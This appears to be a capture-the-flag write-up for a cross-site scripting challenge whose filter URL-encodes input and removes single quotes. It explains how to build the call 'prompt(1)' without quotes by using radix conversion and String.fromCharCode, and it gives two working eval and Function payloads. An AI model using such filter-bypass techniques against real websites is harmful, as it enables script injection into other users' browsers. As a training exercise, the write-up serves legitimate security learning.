This challenge will URL encode input and replace single quote.

Due to the URL Encoding, we cannot use double quotes and backticks, and there is also a `replace()` to sanitize single quotes.
So we basically can't use any string directly here.

But we can try to construct our payload as string by only calling String methods.
If the string we want is pure english lowercase, we can use `parseInt('string',radix)` to get the converted number of specific radix.

And then we can use following syntax convert the number to string:
```javascript
630038579..toString(30) // 'prompt'
```

But if we need special characters, we will need something like `String.fromCharCode()` to do that.
We can use `"(1)".charCodeAt(index)` to get the char code first.

And then we can construct the string and run it in `eval()` or `Function('...')()`!

Payload 1:
```javascript
Function(630038579..toString(30).concat(String.fromCharCode(40).concat(String.fromCharCode(49).concat(String.fromCharCode(41)))))()
```

Payload 2:
```javascript
eval(630038579..toString(30).concat(String.fromCharCode(40).concat(String.fromCharCode(49).concat(String.fromCharCode(41)))))
```